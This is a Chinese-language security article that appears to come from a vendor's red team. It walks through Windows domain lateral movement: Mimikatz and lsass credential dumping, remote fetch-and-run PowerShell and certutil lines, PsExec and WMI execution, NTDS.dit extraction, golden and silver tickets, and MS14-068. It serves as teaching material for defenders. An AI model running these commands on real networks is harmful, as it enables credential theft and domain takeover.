## 一、前言  

**在攻击者获取到某台内网机器的控制权限之后，进一步会考虑如何在内网进行横向移动，以及攻击域控服务器，本文总结了突破边界后进一步的攻击技巧。主要分为Windows域认证背景介绍、技巧总结两部分。**

##  二、Windows域介绍

将网络中多台计算机逻辑上组织到一起进行集中管理，这种区别于工作组的逻辑环境叫做域。域是由域控制器（Domain
Controller）和成员计算机组成，域控制器就是安装了活动目录（Active
Directory）的计算机。活动目录提供了存储网络上对象信息并使用网络使用该数据的方法，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。

###  2.1域的优势

> 1.集中管理，可以集中的管理企业中成千上万分布于异地的计算机和用户。
>
> 2.便捷的网络资源访问，能够容易的定位到域中的资源。
>
> 3.用户一次登录就可访问整个网络资源，集中的身份验证。
>
> 4.网络资源主要包含用户帐户、组、共享文件夹、打印机等
>
> 5.可扩展性，既可以适用于几十台计算机的小规模网络，也可以适用于跨国公司。

###  2.2域渗透常用命令

查询与控制器主机名 ：net group “domain controllers” /domain

![image.png](https://image.3001.net/images/20200304/15833015404405.png!small)可以通过ping主机名获取到域控的ip

![image.png](https://image.3001.net/images/20200304/15833015593538.png!small)

查询域管理用户：net group “domain admins” /domain

![image.png](https://image.3001.net/images/20200304/15833015663972.png!small)

查看所有域用户： net user /domain

![image.png](https://image.3001.net/images/20200304/15833015744513.png!small)

查看加入域的所有计算机名：net group "domain computers" /domain

![image.png](https://image.3001.net/images/20200304/15833015883104.png!small)

查看域密码策略：net accounts /domain

![image.png](https://image.3001.net/images/20200304/15833015987390.png!small)

###  2.3Windows认证协议

Windows有两种认证协议：NTLM（NT LAN
Manager）和Kerberos。域成员计算机在登录的时候可以选择登录到域中或此台电脑，选择登陆到域一般会采用Kerberos协议在域控DC上进行认证。

 **2.3.1NTLM认证协议**

NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。这个协议只支持Windows。NTLM认证协议大概流程：

![image.png](https://image.3001.net/images/20200304/15833016164726.png!small)可以看到NTLM协议基于NTLM
hash，windows本地登陆的密码由LM hash和NTLM hash组成,存储在SAM文件中,前一部分是LM Hash，后一部分是NTLM Hash。

    
    
    administrator:500:6f08d7b306b1dad4ff17365faf1ffe89:032f3db689bf1ee44c04d08c785710de:::

在登陆Windows的时候，系统会将用户输入的密码转换成NTLM hash并与SAM文件中的密码进行对比，如果相同，则认证成功。

 **2.3.2Kerberos认证协议**

Kerberos是一种网络认证协议，整个认证过程涉及到三方：客户端、服务端和 KDC（Key Distribution Center），在 Windows
域环境中，KDC 的角色由 DC（Domain Controller）来担当。

Kerberos基于票据(Ticket)进行安全认证，票据是用来在认证服务器和用户请求的服务之间传递用户身份的凭证。以下是kerberos协议的认证流程：

![image.png](https://image.3001.net/images/20200304/15833016467588.png!small)**第1步：**
KRB_AS_REQ：Client-A发送Authenticator（通过A密码加密的一个时间戳TimeStamp）向KDC的AS服务认证自己的身份；

 **第2步：** KRB_AS_REP：AS通过KDC数据库中存储的Client-A密码的副本，解密收到的Authenticator，如果解密出的TimeStamp符合要求，则AS服务认为Client-A就是所谓的Client-A；

认证成功后，AS服务生成一个短期有效的SessionKeya-kdc，将该Key使用A的密码副本加密成密文1，另外将Key连同时间戳标志（控制该SessionKey的有效时间）通过TGS服务的密码也就是KDC的密码加密为密文2（称为TGT），将这两个密文组合成KRB_AS_REP返回给Client-A；

 **第3步：** KRB_TGS_REQ：Client-A在接收到KRB_AS_REP后，首先使用自身密码解密密文1得到SessionKeya-kdc，此时需要注意的是，密文2（TGT）是被KDC的密码加密的，所以Client-A无法解密，这也是Kerberos协议设计的精妙之处，既解决了Server端（TGS相对于Client-A也称之为Server端）无法及时接收SessionKey的问题，又不怕Client-A对该TGT的伪造，因为Client-A不知道Server端的密码。

得到SessionKeya-kdc后，Client-A利用其加密时间戳生成Authenticator用于向TGS申请Client-A与Client-B进行认证所需的SessionKeya-b，连同刚才KRB_AS_REP接收的TGT一同组合成KRB_TGS_REQ发送给TGS

 **第4步：**
KRB_TGS_REP：TGS在接收到KRB_TGS_REP之后，利用KDC密码解密TGT获得本来就该发送给自己的SessionKeya-kdc，然后用其解密KRB_TGS_REQ中的Authenticator得到Client-A发送过来的时间戳，如果时间戳符合要求，则生成一个短期有效的SessionKeya-b，注意此时利用SessionKeya-kdc将SessionKeya-b加密为密文1，然后利用Server-B的密码将SessionKeya-b加密为密文2（称为ServiceTicket），两个密文一同构成KRB_TGS_REP返回给Client-A；

 **第5步：** KRB_AP_REQ：Client-A在接收到KRB_TGS_REP之后，首先使用缓存的SessionKeya-kdc将密文1中的SessionKeya-b解密出来，然后利用其加密时间戳生成Authenticator用于向B进行对自身的验证，另外，和刚才TGT一样，密文2也就是ServiceTicket是用Server-B的密码加密的，所以Client-A无法解密，也就无法伪造，这也同样解决了在三方认证中作为Server端的B无法及时接收SessionKey的问题，又不怕Client-A对ServiceTicket的伪造；

 **第6步：** KRB_AP_REP：Server-B受到KRB_AP_REQ之后，利用自身密码解密ServiceTicket，得到SessionKeya-b，然后用SessionKeya-b解密Authenticator得到时间戳，验证A的身份。

##  三、域内横向移动技巧

利用NTLM、Kerberos及SMB等协议。攻击者进入内网后会进行横向移动建立多个立足点，常见的技巧包括凭证窃取、横向移动、Pass The
Hash（hash传递）、导出域成员Hash、黄金白银票据、MS14-068等。

###  3.1凭证窃取

窃取凭据来帮助在域内横向移动，一旦获取的密码在内网中是通用的，将会方便横向移动获取目标权限。

 **3.1.1Mimikatz**

Mimikatz一款windows平台下的神器，它具备很多功能，其中最亮眼的功能是直接从 lsass.exe
进程里获取windows处于active状态账号的明文密码。

读取明文密码原理：在 Windows 中，当用户登录时，lsass.exe
使用一个可逆的算法加密明文，并会将密文保存在内存中，Mimikatz就是通过抓取内存去还原明文。

> 项目地址：<https://github.com/gentilkiwi/mimikatz>

用法：

    
    
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"

![image.png](https://image.3001.net/images/20200304/15833017249951.png!small)

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。

cmd修改注册表命令：

    
    
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

重启或用户重新登录后可以成功抓取。

 **3.1.2Procdump**

Procdump是微软官方发布的一款调试工具，因此不会被各种杀毒软件查杀。通常使用procdump转储内存文件到本地再使用mimikatz抓取文件中的hash来躲避杀软检测。

下载地址：

> <https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump>

1、使用procdump将目标的lsass.exe转储成dmp文件

    
    
    procdump64.exe -accepteula -ma lsass.exe lsass.dmp

![image.png](https://image.3001.net/images/20200304/15833017378098.png!small)

2、使用mimikatz从转储的lsass.dmp中来读取明文密码

    
    
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"

![image.png](https://image.3001.net/images/20200304/15833017522904.png!small)

**3.1.3Getpass**

Getapss是由闪电小子根据mimikatz编译的一个工具，可以直接获取明文密码，直接运行Getpass.exe即可：

![image.png](https://image.3001.net/images/20200304/15833017791624.png!small)

**3.1.4Powershell脚本抓取**

当目标系统存在powershell时，可直接一句powershell代码调用抓取，前提是目标可出外网，否则需要将ps1脚本放置内网之中。执行:

    
    
    powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1’);Get-PassHashes

 **3.1.5Sam破解**

使用注册表来离线导出Hash

    
    
    reg save HKLM\SYSTEM system.hiv
    
        reg save HKLM\SAM sam.hiv
    
        reg save hklm\security security.hiv

导出后可以使用mimikatz加载sam.hiv和sam.hiv来导出Hash。或者使用impacket 套件中secretsdump.py
脚本去解密，也是可以的。

    
    
    python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL

###  3.2横向移动

 **3.2.1IPC+计划任务**

通过ipc$实现对windows默认共享的访问，配合计划任务执行后门程序获取服务器权限。

1、通过net use建立IPC$连接

    
    
    net use \\192.168.91.131\IPC$ /user:"administrator" "abc@123"

![image.png](https://image.3001.net/images/20200304/15833018286050.png!small)

2、利用copy上传后门文件

> copy D:\test.bat [\\\186.64.10.13\c$](file://186.64.10.13/c$)

![image.png](https://image.3001.net/images/20200304/15833018404700.png!small)

3、创建计划任务执行后门程序

    
    
    schtasks /create /s 186.64.10.13 /u Administrator /p Admin@123.. /ru "SYSTEM" /tn test /sc DAILY /st 22:18 /tr C:\\windows\\temp\\test.bat /F

创建计划任务，/tn是任务名称，/sc是任务运行频率，这里指定为每天运行， /tr指定运行的文件，/F表示强制创建任务

    
    
    schtasks /run /s 186.64.10.13 /u administrator /p Admin@123.. /tn test /i

运行任务，其中/i表示 **立即运行**

    
    
    schtasks /delete /s 186.64.10.13 /u administrator /p Admin@123.. /tn test /f

删除计划任务

![image.png](https://image.3001.net/images/20200304/15833018684556.png!small)

低版本的操作系统可以直接使用at创建计划任务：

net time \\\186.64.10.13 at \\\186.64.10.13 18:01 c:\windows\temp\test.bat

 **3.2.2PsExec(445端口)**

PsExec来自Microsoft的Sysinternals套件，它首先通过SMB连接到目标上的ADMIN$共享,上传psexesvc.exe，然后使用服务控制管理器启动.exe，以在远程系统上创建命名管道，最后使用该管道进行I/O

> 下载地址：<https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec>

1、通过ADMIN$连接，然后释放psexesvc.exe到目标机器。

2、通过服务管理SCManager远程创建psexecsvc服务，并启动服务。

3、客户端连接执行命令,服务端启动相应的程序并执行回显数据。

    
    
    psexec \\186.64.10.13 -u Domain\User -p Password Command

![image.png](https://image.3001.net/images/20200304/15833018908934.png!small)

或者返回交互式shell:

![image.png](https://image.3001.net/images/20200304/15833019001585.png!small)

**3.2.3WMI(135端口)**

WMI(Windows Management
Instrumentation，Windows管理规范)是一项核心的Windows管理技术；用户可以使用WMI管理本地和远程计算机

通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问（以及以后的临时端口）,
它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。 它可以通过wmic.exe直接进行交互。

查询进程信息：

    
    
    wmic /node:186.64.10.13 /user:Administrator /password:Admin@123.. process list brief

![image.png](https://image.3001.net/images/20200304/15833019207800.png!small)

首先WMI并不支持执行命令，而是支持执行文件但是你可以加相应的参数，比如

    
    
    wmic /node:186.64.10.13 /user:Administrator /password:Admin@123.. process call create "cmd.exe /c ipconfig"

![image.png](https://image.3001.net/images/20200304/15833019312087.png!small)

创建进程：

    
    
    wmic /node:186.64.10.13 /user:Administrator /password:Admin@123 process call create "calc.exe"

下载远程文件并执行:

    
    
    wmic /node:186.64.10.13 /user:Administrator /password:Admin@123 process call create "cmd /c  certutil.exe -urlcache -split -f http://186.64.10.13/test.exe c:/windows/temp/test.exe & c:/windows/temp/test.exe"

创建交互式shell:

使用py脚本调用WMI来模拟psexec的功能，基本上psexec能用的地方，这个脚本也能够使用。原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令的结果和获取半交互式的shell

    
    
    python wmiexec.py -share admin$ administrator:password@186.64.10.13

![image.png](https://image.3001.net/images/20200304/15833019496220.png!small)

**3.2.4WinRM远程管理服务**

WinRM指的是Windows远程管理服务，通过远程连接winRM模块可以操作windows命令行，默认监听端口5985（HTTP）&5986
(HTTPS)，在2012以后默认开启。

执行命令：

    
    
    winrs -r:http://186.64.10.13:5985 -u:Administrator -p:Admin@123.. "whoami /all"
    
        winrs -r:http://186.64.10.13:5985 -u:Administrator -p:Admin@123.. "cmd.exe"

![image.png](https://image.3001.net/images/20200304/15833019684740.png!small)

**3.2.5SmbExec(445端口)**

smbexec是一款基于psexec的域渗透测试工具，并配套samba工具。

    
    
    Smbexec.py administrator:password@186.64.10.13

![image.png](https://image.3001.net/images/20200304/15833019793725.png!small)

###  3.3Pass The Hash

PTH(pass the hash)攻击是指攻击者可以直接通过LM Hash(已弃用)或NTLM
Hash访问远程主机或服务，而不提供明文密码。在Windows系统中，使用NTLM进行身份认证，当获取用户hash后，可以使用Hash传递的方式获取访问权限。

 **3.3.1Mimikatz**

![image.png](https://image.3001.net/images/20200304/15833019962490.png!small)

首先登录目标机器，以管理员身份运行mimikatz，并输入以下命令获取administrator账户的ntlm hash：

    
    
    Mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords”

![image.png](https://image.3001.net/images/20200304/15833020121.png!small)

在攻击机器上利用mimikatz将获取的hash注入到内存中，成功后用dir命令可以成功列出目录文件：

    
    
    sekurlsa::pth /domain:. /user:Administrator /ntlm: 70be8675cd511daa9be4b8f49e829327

![image.png](https://image.3001.net/images/20200304/15833020341597.png!small)

注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。

###  3.4导出域成员Hash

域账户的用户名和hash密码以域数据库的形式存放在域控制器的%SystemRoot%\ntds\NTDS.DIT文件中。

![image.png](https://image.3001.net/images/20200304/15833020426925.png!small)

ntdsutil.exe是域控制器自带的域数据库管理工具，因此我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库。

创建快照：

    
    
    ntdsutil snapshot "activate instance ntds" create quit quit

![image.png](https://image.3001.net/images/20200304/158330205415.png!small)

加载快照：

    
    
    ntdsutil snapshot "mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit

![image.png](https://image.3001.net/images/20200304/15833020647870.png!small)

Copy文件副本：

    
    
    copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit

![image.png](https://image.3001.net/images/20200304/15833020748012.png!small)

将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：

![image.png](https://image.3001.net/images/20200304/15833020816765.png!small)

最后记得卸载删除快照：

    
    
    ntdsutil snapshot "unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
    
        ntdsutil snapshot "delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit

 **3.4.1mimikatz导出域内hash**

mimikatz有两种方式可以导出域内hash。

1、直接在域控制器中执行Mimikatz，通过lsass.exe进程dump出密码哈希。

    
    
    mimikatz log "privilege::debug" "lsadump::lsa /patch" exi

![image.png](https://image.3001.net/images/20200304/1583302107796.png!small)

另外一种方式是通过dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取。

    
    
    lsadump::dcsync /domain:test.com /all /csv

![image.png](https://image.3001.net/images/20200304/15833021213249.png!small)

也可以制定获取某个用户的hash：

    
    
    lsadump::dcsync /domain:test.com /user:test

![image.png](https://image.3001.net/images/20200304/15833021346659.png!small)

**3.4.2黄金票据**

域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要获取到了krbtgt用户的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden
Ticket，此类攻击方法被称为票据传递攻击。

首先获取krbtgt的用户hash:

    
    
    mimikatz "lsadump::dcsync /domain:xx.com /user:krbtgt"

![image.png](https://image.3001.net/images/20200304/15833021454668.png!small)

在普通域成员上执行dir命令提示“拒绝访问”：

![image.png](https://image.3001.net/images/20200304/15833021564184.png!small)

之后利用mimikatz生成域管权限的Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：

    
    
    kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi

![image.png](https://image.3001.net/images/20200304/15833021736848.png!small)

导入刚才生成的票据：

    
    
    kerberos::ptt test.kiribi

导入成功后，可以获取域管权限：

    
    
    Dir \\dc.abc.com\c$

![image.png](https://image.3001.net/images/20200304/15833021917278.png!small)

**3.4.3白银票据**

黄金票据和白银票据的一些区别：

Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限，且由krbtgt的hash加密，金票在使用的过程需要和域控通信

白银票据：伪造TGS，只能访问指定的服务，且由服务账号（通常为计算机账户）的Hash加密 ，银票在使用的过程不需要同域控通信

1.在域控上导出hash

mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

![image.png](https://image.3001.net/images/20200304/15833022389491.png!small)

2、利用Hash制作一张cifs服务的白银票据：

kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969
/target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs
/user:strage /ptt

![image.png](https://image.3001.net/images/20200304/15833022478731.png!small)

cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:

![image.png](https://image.3001.net/images/20200304/15833022549963.png!small)

**3.4.4MS14-068**

MS14-068域提权漏洞，对应补丁编号：kb3011780，利用该漏洞可以将任何一个域用户提权至域管理员权限。

1、在普通域用户机器上直接访问域控制器的C盘目录

![image.png](https://image.3001.net/images/20200304/15833022661721.png!small)

2、利用MS14-068伪造生成TGT：

    
    
    MS14-068.exe -u strage@test.com -s S-1-5-21-457432167-2946190674-2696793547-1103 -d 192.168.140.140 -p Admin@str

![image.png](https://image.3001.net/images/20200304/15833022761821.png!small)

3、利用mimikatz将工具得到的TGT票据写入内存，创建缓存证书：

    
    
    mimikatz.exe "kerberos::ptc TGT_strage@test.com.ccache" exit

![image.png](https://image.3001.net/images/20200304/15833022973102.png!small)![image.png](https://image.3001.net/images/20200304/15833023108324.png!small)

4、重新执行dir命令：

> dir [\\\dc\C$](file://dc/C$)

![](https://www.geekpark.net/zhuanti/edit/js/ueditor/themes/default/images/spacer.gif)

## 四、总结

本文从攻击者视角总结了突破边界后的攻击技巧，
我们团队开发ips规则也从相关协议和流量角度来发现攻击者进入内网的痕迹。后续如果从防护角度有新的分析结果我们也会进行分享出来，同时也欢迎攻防大佬一起交流。由于水平有限，欢迎大家指出文中的错误和交流指教。

 **参考资料：**

> 1、<https://blog.csdn.net/weixin_30532987/article/details/96203552>
> 【Kerberos的白银票据详解】
>
> 2、<https://www.freebuf.com/vuls/56081.html> 【深入解读MS14-068漏洞】
>
> 3、<https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html>
> 【Windows安全认证是如何进行的？[NTLM篇]】
>
> 4、<https://www.cnblogs.com/-qing-/p/11349134.html> 【域渗透基础之Kerberos认证协议】

***本文作者：新华三攻防团队，转载请注明来自FreeBuf.COM**

